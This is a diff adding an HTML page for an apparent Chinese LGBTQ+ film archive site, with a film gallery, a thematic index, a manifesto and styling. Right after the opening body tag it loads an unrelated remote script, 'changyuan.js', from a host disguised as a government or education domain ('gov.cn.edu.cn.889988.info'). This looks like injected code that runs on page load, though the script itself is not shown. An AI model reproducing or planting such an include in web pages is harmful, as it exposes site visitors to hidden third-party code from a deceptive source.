@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>男同电影网 | 多元影像·独立视角·男性情感电影档案</title>
+<meta name="description" content="男同电影网（nantongdianyingwang.top）聚焦男性情感与多元性别议题的影像档案库。收录全球LGBTQ+题材电影、独立短片、纪录片与实验影像，从经典到先锋，记录男性情感的多元表达方式。为影迷提供有深度、有态度、有温度的选片参考。">
+<meta name="keywords" content="男同电影网, nantongdianyingwang, LGBTQ电影, 男性情感, 同性题材, 独立电影, 多元性别影像, 酷儿电影">
+<style>
+/* ===== Monochrome + Accent Color System ===== */
+:root {
+  --mono-0: #000000;
+  --mono-1: #0a0a0a;
+  --mono-2: #1a1a1a;
+  --mono-3: #2a2a2a;
+  --mono-4: #444444;
+  --mono-5: #666666;
+  --mono-6: #999999;
+  --mono-7: #cccccc;
+  --mono-8: #e8e8e8;
+  --mono-9: #f5f5f5;
+  --mono-10: #fafafa;
+  --paper: #ffffff;
+  --accent: #ff3b30;
+  --accent-dark: #cc2e26;
+  --grid-line: #e0e0e0;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  background: var(--paper);
+  color: var(--mono-1);
+  font-family: "Helvetica Neue", "Arial", "PingFang SC", "Microsoft YaHei", sans-serif;
+  line-height: 1.7;
+  font-size: 15px;
+  -webkit-font-smoothing: antialiased;
+}
+
+a { color: inherit; text-decoration: none; }
+
+/* ===== Utility ===== */
+.wrap { max-width: 1400px; margin: 0 auto; padding: 0 2rem; }
+.big-num {
+  font-size: clamp(3rem, 10vw, 8rem);
+  font-weight: 900;
+  line-height: 0.85;
+  color: var(--mono-8);
+  letter-spacing: -0.05em;
+}
+
+/* ===== Top Utility Bar ===== */
+.utility-bar {
+  background: var(--mono-10);
+  border-bottom: 1px solid var(--grid-line);
+  padding: 0.4rem 0;
+  font-size: 0.7rem;
+  color: var(--mono-5);
+}
+.utility-bar .wrap {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.utility-bar .domain {
+  font-family: "SF Mono", "Cascadia Code", monospace;
+  letter-spacing: 0.02em;
+}
+
+/* ===== Header ===== */
+.header {
+  padding: 1.5rem 0;
+  border-bottom: 3px solid var(--mono-1);
+  position: sticky;
+  top: 0;
+  background: rgba(255,255,255,0.95);
+  backdrop-filter: blur(10px);
+  z-index: 100;
+}
+.header .wrap {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 2rem;
+}
+.logo {
+  font-size: 1.6rem;
+  font-weight: 900;
+  letter-spacing: -0.03em;
+  display: flex;
+  align-items: baseline;
+  gap: 0.4rem;
+}
+.logo .accent-dot {
+  width: 10px; height: 10px;
+  background: var(--accent);
+  border-radius: 50%;
+  display: inline-block;
+}
+.nav-main {
+  display: flex;
+  gap: 2rem;
+  list-style: none;
+  font-size: 0.85rem;
+  font-weight: 600;
+}
+.nav-main a {
+  padding: 0.3rem 0;
+  border-bottom: 2px solid transparent;
+  transition: border-color 0.2s;
+}
+.nav-main a:hover { border-bottom-color: var(--accent); }
+
+/* ===== Hero ===== */
+.hero {
+  padding: 5rem 0 4rem;
+  border-bottom: 1px solid var(--grid-line);
+}
+.hero-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 4rem;
+  align-items: end;
+}
+.hero-left h1 {
+  font-size: clamp(2.5rem, 6vw, 5rem);
+  font-weight: 900;
+  line-height: 0.95;
+  letter-spacing: -0.04em;
+  margin: 1rem 0 1.5rem;
+}
+.hero-left h1 .red { color: var(--accent); }
+.hero-left p {
+  font-size: 1.1rem;
+  color: var(--mono-4);
+  max-width: 480px;
+  line-height: 1.8;
+}
+.hero-right {
+  text-align: right;
+}
+.hero-right .meta-block {
+  display: inline-block;
+  text-align: left;
+  border-left: 3px solid var(--accent);
+  padding-left: 1.5rem;
+}
+.hero-right .meta-block dt {
+  font-size: 0.7rem;
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  color: var(--mono-5);
+  margin-bottom: 0.2rem;
+}
+.hero-right .meta-block dd {
+  font-size: 0.9rem;
+  margin-bottom: 1rem;
+  font-family: "SF Mono", monospace;
+}
+
+/* ===== Section Frame ===== */
+.section {
+  padding: 5rem 0;
+  border-bottom: 1px solid var(--grid-line);
+}
+.sec-head {
+  display: grid;
+  grid-template-columns: auto 1fr;
+  gap: 2rem;
+  align-items: baseline;
+  margin-bottom: 3rem;
+  padding-bottom: 1rem;
+  border-bottom: 1px solid var(--mono-1);
+}
+.sec-head .label {
+  font-size: 0.7rem;
+  font-weight: 700;
+  letter-spacing: 0.15em;
+  text-transform: uppercase;
+  color: var(--accent);
+}
+.sec-head h2 {
+  font-size: 1.8rem;
+  font-weight: 900;
+  letter-spacing: -0.02em;
+}
+.sec-head .en {
+  font-size: 0.75rem;
+  color: var(--mono-5);
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+}
+
+/* ===== Horizontal Scroll Gallery ===== */
+.gallery {
+  display: flex;
+  gap: 1.5rem;
+  overflow-x: auto;
+  padding: 0.5rem 0 2rem;
+  scroll-snap-type: x mandatory;
+  -webkit-overflow-scrolling: touch;
+  scrollbar-width: thin;
+}
+.gallery::-webkit-scrollbar { height: 4px; }
+.gallery::-webkit-scrollbar-thumb { background: var(--mono-7); border-radius: 2px; }
+
+.gallery-item {
+  flex: 0 0 280px;
+  scroll-snap-align: start;
+  border: 1px solid var(--grid-line);
+  transition: all 0.3s ease;
+}
+.gallery-item:hover {
+  border-color: var(--mono-1);
+  transform: translateY(-4px);
+  box-shadow: 8px 8px 0 var(--mono-1);
+}
+.gallery-poster {
+  width: 100%;
+  height: 380px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 3rem;
+  position: relative;
+  overflow: hidden;
+}
+.gallery-poster::after {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0; bottom: 0;
+  border: 8px solid rgba(0,0,0,0.03);
+}
+.gp-1 { background: #f0f0f0; }
+.gp-2 { background: #e8e8e8; }
+.gp-3 { background: #d0d0d0; }
+.gp-4 { background: #c0c0c0; }
+.gp-5 { background: #b0b0b0; }
+.gp-6 { background: #a0a0a0; }
+.gallery-info {
+  padding: 1rem;
+  border-top: 1px solid var(--grid-line);
+}
+.gallery-info h3 {
+  font-size: 0.95rem;
+  font-weight: 700;
+  margin-bottom: 0.3rem;
+}
+.gallery-info .year {
+  font-size: 0.75rem;
+  color: var(--mono-5);
+  font-family: "SF Mono", monospace;
+}
+.gallery-info .tag {
+  display: inline-block;
+  margin-top: 0.5rem;
+  padding: 0.15rem 0.5rem;
+  background: var(--mono-1);
+  color: #fff;
+  font-size: 0.65rem;
+  border-radius: 2px;
+}
+
+/* ===== Numbered List Section ===== */
+.numbered-list {
+  counter-reset: item;
+  list-style: none;
+}
+.numbered-list li {
+  counter-increment: item;
+  display: grid;
+  grid-template-columns: 80px 1fr 200px;
+  gap: 2rem;
+  padding: 2rem 0;
+  border-bottom: 1px solid var(--grid-line);
+  align-items: start;
+  transition: padding 0.3s ease;
+}
+.numbered-list li:hover { padding-left: 1rem; }
+.numbered-list li::before {
+  content: counter(item, decimal-leading-zero);
+  font-size: 2.5rem;
+  font-weight: 900;
+  color: var(--mono-8);
+  line-height: 1;
+  font-family: "SF Mono", monospace;
+}
+.numbered-list .list-content h3 {
+  font-size: 1.2rem;
+  font-weight: 700;
+  margin-bottom: 0.4rem;
+}
+.numbered-list .list-content p {
+  font-size: 0.85rem;
+  color: var(--mono-4);
+  line-height: 1.7;
+}
+.numbered-list .list-meta {
+  font-size: 0.75rem;
+  color: var(--mono-5);
+  font-family: "SF Mono", monospace;
+  text-align: right;
+}
+.numbered-list .list-meta strong {
+  display: block;
+  color: var(--accent);
+  font-size: 0.85rem;
+  margin-bottom: 0.2rem;
+}
+
+/* ===== Split Section ===== */
+.split-section {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 0;
+  border: 1px solid var(--grid-line);
+}
+.split-box {
+  padding: 3rem;
+  border-right: 1px solid var(--grid-line);
+}
+.split-box:last-child { border-right: none; }
+.split-box.dark {
+  background: var(--mono-1);
+  color: var(--mono-9);
+}
+.split-box h3 {
+  font-size: 1.4rem;
+  font-weight: 900;
+  margin-bottom: 1rem;
+  letter-spacing: -0.02em;
+}
+.split-box p {
+  font-size: 0.9rem;
+  color: var(--mono-4);
+  line-height: 1.8;
+}
+.split-box.dark p { color: var(--mono-7); }
+.split-box .quote {
+  font-size: 1.1rem;
+  font-weight: 600;
+  font-style: italic;
+  line-height: 1.6;
+  padding: 1rem 0;
+  border-top: 2px solid var(--accent);
+  border-bottom: 2px solid var(--accent);
+}
+
+/* ===== Minimal Cards ===== */
+.mini-cards {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+  gap: 0;
+  border-top: 1px solid var(--mono-1);
+  border-left: 1px solid var(--mono-1);
+}
+.mini-card {
+  border-right: 1px solid var(--mono-1);
+  border-bottom: 1px solid var(--mono-1);
+  padding: 2rem;
+  transition: background 0.3s ease;
+}
+.mini-card:hover { background: var(--mono-9); }
+.mini-card .idx {
+  font-size: 0.7rem;
+  font-weight: 700;
+  color: var(--accent);
+  margin-bottom: 0.8rem;
+}
+.mini-card h4 {
+  font-size: 1rem;
+  font-weight: 700;
+  margin-bottom: 0.5rem;
+}
+.mini-card p {
+  font-size: 0.8rem;
+  color: var(--mono-4);
+  line-height: 1.6;
+}
+
+/* ===== Footer ===== */
+.footer {
+  background: var(--mono-1);
+  color: var(--mono-7);
+  padding: 4rem 0 2rem;
+}
+.footer .wrap {
+  display: grid;
+  grid-template-columns: 2fr 1fr 1fr 1fr;
+  gap: 3rem;
+}
+.footer-brand .logo { color: #fff; margin-bottom: 1rem; }
+.footer-brand p { font-size: 0.8rem; color: var(--mono-5); }
+.footer-brand .domain-link {
+  display: inline-block;
+  margin-top: 1rem;
+  padding: 0.5rem 1rem;
+  background: var(--mono-2);
+  border-radius: 4px;
+  font-family: "SF Mono", monospace;
+  font-size: 0.75rem;
+  color: var(--accent);
+}
+.footer-col h4 {
+  font-size: 0.75rem;
+  font-weight: 700;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  color: #fff;
+  margin-bottom: 1rem;
+}
+.footer-col ul { list-style: none; }
+.footer-col li { margin-bottom: 0.5rem; }
+.footer-col a {
+  font-size: 0.8rem;
+  color: var(--mono-5);
+  transition: color 0.2s;
+}
+.footer-col a:hover { color: var(--accent); }
+.footer-bottom {
+  margin-top: 3rem;
+  padding-top: 1.5rem;
+  border-top: 1px solid var(--mono-3);
+  font-size: 0.7rem;
+  color: var(--mono-5);
+  text-align: center;
+}
+
+/* ===== Responsive ===== */
+@media (max-width: 900px) {
+  .hero-grid { grid-template-columns: 1fr; gap: 2rem; }
+  .hero-right { text-align: left; }
+  .numbered-list li {
+    grid-template-columns: 50px 1fr;
+  }
+  .numbered-list .list-meta {
+    grid-column: 2;
+    text-align: left;
+  }
+  .split-section { grid-template-columns: 1fr; }
+  .split-box { border-right: none; border-bottom: 1px solid var(--grid-line); }
+  .footer .wrap { grid-template-columns: 1fr 1fr; }
+  .nav-main { display: none; }
+}
+
+@media (max-width: 560px) {
+  .wrap { padding: 0 1rem; }
+  .sec-head { grid-template-columns: 1fr; gap: 0.5rem; }
+  .gallery-item { flex: 0 0 220px; }
+  .mini-cards { grid-template-columns: 1fr; }
+  .footer .wrap { grid-template-columns: 1fr; }
+  .numbered-list li { grid-template-columns: 40px 1fr; gap: 1rem; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- Utility Bar -->
+<div class="utility-bar">
+  <div class="wrap">
+    <span>nantongdianyingwang.top</span>
+    <span>影像档案 · 独立视角 · 多元表达</span>
+  </div>
+</div>
+
+<!-- Header -->
+<header class="header">
+  <div class="wrap">
+    <div class="logo">
+      男同电影网<span class="accent-dot"></span>
+    </div>
+    <nav>
+      <ul class="nav-main">
+        <li><a href="#archive">档案库</a></li>
+        <li><a href="#voices">多元声音</a></li>
+        <li><a href="#manifesto">平台主张</a></li>
+        <li><a href="#index">影片索引</a></li>
+        <li><a href="#about">关于我们</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="wrap">
+    <div class="hero-grid">
+      <div class="hero-left">
+        <div style="font-size:0.7rem;font-weight:700;letter-spacing:0.2em;color:var(--accent);">FILM ARCHIVE / 影像档案</div>
+        <h1>男同<span class="red">电影网</span><br>影像即表达</h1>
+        <p>一个专注于男性情感与多元性别议题的影像档案库。我们相信每一部真诚讲述男性情感故事的电影，都值得被看见、被讨论、被记住。</p>
+      </div>
+      <div class="hero-right">
+        <dl class="meta-block">
+          <dt>网站名称</dt>
+          <dd>男同电影网</dd>
+          <dt>主域名</dt>
+          <dd>nantongdianyingwang.top</dd>
+          <dt>GitHub Pages</dt>
+          <dd>https://nantongdianyingwang-top.github.io</dd>
+          <dt>收录方向</dt>
+          <dd>LGBTQ+ / 酷儿电影 / 独立影像</dd>
+        </dl>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Gallery -->
+<section class="section" id="archive">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="label">01 — Archive</span>
+      <h2>经典档案</h2>
+      <span class="en">滑动浏览 →</span>
+    </div>
+    <div class="gallery">
+      <div class="gallery-item">
+        <div class="gallery-poster gp-1">🎬</div>
+        <div class="gallery-info">
+          <h3>《断背山》</h3>
+          <span class="year">2005 · 李安</span>
+          <br><span class="tag">经典</span>
+        </div>
+      </div>
+      <div class="gallery-item">
+        <div class="gallery-poster gp-2">🏳️‍🌈</div>
+        <div class="gallery-info">
+          <h3>《请以你的名字呼唤我》</h3>
+          <span class="year">2017 · 卢卡·瓜达尼诺</span>
+          <br><span class="tag">爱情</span>
+        </div>
+      </div>
+      <div class="gallery-item">
+        <div class="gallery-poster gp-3">📽️</div>
+        <div class="gallery-info">
+          <h3>《月光男孩》</h3>
+          <span class="year">2016 · 巴里·杰金斯</span>
+          <br><span class="tag">奥斯卡</span>
+        </div>
+      </div>
+      <div class="gallery-item">
+        <div class="gallery-poster gp-4">🌙</div>
+        <div class="gallery-info">
+          <h3>《燃烧女子的肖像》</h3>
+          <span class="year">2019 · 瑟琳·席安玛</span>
+          <br><span class="tag">法国</span>
+        </div>
+      </div>
+      <div class="gallery-item">
+        <div class="gallery-poster gp-5">💔</div>
+        <div class="gallery-info">
+          <h3>《爱你，西蒙》</h3>
+          <span class="year">2018 · 格里格·伯兰蒂</span>
+          <br><span class="tag">青春</span>
+        </div>
+      </div>
+      <div class="gallery-item">
+        <div class="gallery-poster gp-6">🔥</div>
+        <div class="gallery-info">
+          <h3>《上帝之国》</h3>
+          <span class="year">2017 · 弗朗西斯·李</span>
+          <br><span class="tag">英国</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Numbered List -->
+<section class="section" id="index">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="label">02 — Index</span>
+      <h2>影片索引</h2>
+      <span class="en">编号目录</span>
+    </div>
+    <ul class="numbered-list">
+      <li>
+        <div class="list-content">
+          <h3>《隐秘的角落》式叙事 —— 东亚语境下的压抑与释放</h3>
+          <p>探讨东亚文化中男性情感的压抑表达，从台湾新电影到当代华语独立制作，情感如何在含蓄中爆发。</p>
+        </div>
+        <div class="list-meta">
+          <strong>华语</strong>
+          独立 / 剧情<br>
+          2000s - 2020s
+        </div>
+      </li>
+      <li>
+        <div class="list-content">
+          <h3>法国新浪潮的酷儿基因</h3>
+          <p>从让·热内的《情歌恋曲》到当代瑟琳·席安玛，法国电影如何用作者视角重构男性情感的浪漫与克制。</p>
+        </div>
+        <div class="list-meta">
+          <strong>法国</strong>
+          艺术 / 作者<br>
+          1950s - 2020s
+        </div>
+      </li>
+      <li>
+        <div class="list-content">
+          <h3>拉美新电影中的男性身体政治</h3>
+          <p>巴西、阿根廷、墨西哥的新锐导演如何用热带气息与政治隐喻，重新书写拉丁美洲的男性情感图景。</p>
+        </div>
+        <div class="list-meta">
+          <strong>拉美</strong>
+          政治 / 身体<br>
+          2010s - 2020s
+        </div>
+      </li>
+      <li>
+        <div class="list-content">
+          <h3>北欧冷调中的温暖 —— 同志电影的另一种可能</h3>
+          <p>瑞典、丹麦、挪威的LGBTQ+电影以冷静克制著称，却在极简叙事中传递最深沉的情感力量。</p>
+        </div>
+        <div class="list-meta">
+          <strong>北欧</strong>
+          极简 / 治愈<br>
+          2000s - 2020s
+        </div>
+      </li>
+      <li>
+        <div class="list-content">
+          <h3>东南亚的温柔革命 —— 泰国、菲律宾同志电影崛起</h3>
+          <p>从泰国BL剧集的文化输出到菲律宾独立电影的国际获奖，东南亚正在成为全球酷儿电影的重要阵地。</p>
+        </div>
+        <div class="list-meta">
+          <strong>东南亚</strong>
+          青春 / 流行<br>
+          2010s - 2020s
+        </div>
+      </li>
+    </ul>
+  </div>
+</section>
+
+<!-- Split Section -->
+<section class="section" id="manifesto" style="padding:0;">
+  <div class="wrap">
+    <div class="sec-head" style="margin-top:5rem;">
+      <span class="label">03 — Manifesto</span>
+      <h2>平台主张</h2>
+      <span class="en">我们为什么做这件事</span>
+    </div>
+  </div>
+  <div class="split-section">
+    <div class="split-box dark">
+      <h3>影像是一种权利</h3>
+      <p class="quote">"电影不是逃避现实的工具，而是理解现实的途径。"</p>
+      <p style="margin-top:1.5rem;">我们相信，男性情感的表达不应被局限于刻板印象。无论是爱情、友情、亲情还是自我认同，每一种真实的情感都值得被影像记录。男同电影网致力于打破偏见，让多元的男性情感故事被更多人看见。</p>
+    </div>
+    <div class="split-box">
+      <h3>我们收录什么？</h3>
+      <p>• <strong>经典重估：</strong>那些曾被忽略或误读的酷儿经典，重新进入讨论视野。</p>
+      <p>• <strong>独立新声：</strong>无预算限制的创作者如何用手机、用短片、用实验形式讲述真实故事。</p>
+      <p>• <strong>跨文化对话：</strong>从好莱坞到独立制片，从东亚含蓄到拉美热烈，不同文化的情感表达如何对话。</p>
+      <p>• <strong>纪录片档案：</strong>真实的口述历史、社会运动影像、个人vlog，记录时代中的个体经验。</p>
+      <p>• <strong>实验先锋：</strong>模糊剧情与纪录边界的影像诗，探索电影语言本身的可能性。</p>
+    </div>
+  </div>
+</section>
+
+<!-- Voices -->
+<section class="section" id="voices">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="label">04 — Voices</span>
+      <h2>多元声音</h2>
+      <span class="en">四个视角</span>
+    </div>
+    <div class="mini-cards">
+      <div class="mini-card">
+        <div class="idx">01</div>
+        <h4>导演视角</h4>
+        <p>创作者如何在不被市场定义的情况下，用影像说出想说的话。独立制片人的生存策略与创作自由。</p>
+      </div>
+      <div class="mini-card">
+        <div class="idx">02</div>
+        <h4>演员视角</h4>
+        <p>表演男性情感的复杂性。演员如何在角色中找到真实，又如何在表演后回归自我。</p>
+      </div>
+      <div class="mini-card">
+        <div class="idx">03</div>
+        <h4>观众视角</h4>
+        <p>一部电影如何改变一个人的自我认知。观众来信中那些被电影治愈的瞬间。</p>
+      </div>
+      <div class="mini-card">
+        <div class="idx">04</div>
+        <h4>学者视角</h4>
+        <p>酷儿电影理论的本土化路径。如何用华语语境理解全球酷儿影像的发展脉络。</p>
+      </div>
+      <div class="mini-card">
+        <div class="idx">05</div>
+        <h4>策展视角</h4>
+        <p>电影节选片的逻辑与困境。独立影展如何在审查与市场需求之间找到平衡。</p>
+      </div>
+      <div class="mini-card">
+        <div class="idx">06</div>
+        <h4>技术视角</h4>
+        <p>低预算也能出好作品。手机拍摄、自然光、非职业演员，技术限制如何成为美学选择。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- About -->
+<section class="section" id="about">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="label">05 — About</span>
+      <h2>关于男同电影网</h2>
+      <span class="en">关于我们</span>
+    </div>
+    <div class="split-section">
+      <div class="split-box">
+        <h3>我们的故事</h3>
+        <p>男同电影网（nantongdianyingwang.top）成立于2024年，由一群热爱电影的独立策展人、影评人和程序员共同发起。我们希望建立一个不依赖商业平台、不被算法裹挟的影像档案库，让那些真正值得被看见的男性情感故事，有一个安放的地方。</p>
+      </div>
+      <div class="split-box dark">
+        <h3>联系与合作</h3>
+        <p>我们欢迎独立导演、制片人、影评人、策展人任何形式的合作。如果你有一部作品想被更多人看见，或者你想为我们的档案库贡献内容，欢迎随时联系。</p>
+        <p style="margin-top:1rem;font-family:'SF Mono',monospace;font-size:0.8rem;">GitHub Pages: nantongdianyingwang-top.github.io</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="footer">
+  <div class="wrap">
+    <div class="footer-brand">
+      <div class="logo">男同电影网<span class="accent-dot"></span></div>
+      <p>影像即表达。专注于男性情感与多元性别议题的影像档案库。</p>
+      <a href="https://nantongdianyingwang-top.github.io" class="domain-link">nantongdianyingwang-top.github.io</a>
+    </div>
+    <div class="footer-col">
+      <h4>档案</h4>
+      <ul>
+        <li><a href="#archive">经典档案</a></li>
+        <li><a href="#index">影片索引</a></li>
+        <li><a href="#">纪录片专区</a></li>
+        <li><a href="#">短片实验</a></li>
+      </ul>
+    </div>
+    <div class="footer-col">
+      <h4>内容</h4>
+      <ul>
+        <li><a href="#voices">多元声音</a></li>
+        <li><a href="#manifesto">平台主张</a></li>
+        <li><a href="#">影评文章</a></li>
+        <li><a href="#">策展笔记</a></li>
+      </ul>
+    </div>
+    <div class="footer-col">
+      <h4>关于</h4>
+      <ul>
+        <li><a href="#about">关于我们</a></li>
+        <li><a href="#">投稿须知</a></li>
+        <li><a href="#">免责声明</a></li>
+        <li><a href="#">联系合作</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <p>© 2024 男同电影网 (nantongdianyingwang.top) · 影像即表达</p>
+    <p style="margin-top:0.3rem;">Website: https://nantongdianyingwang-top.github.io</p>
+  </div>
+</footer>
+
+</body>
+</html>
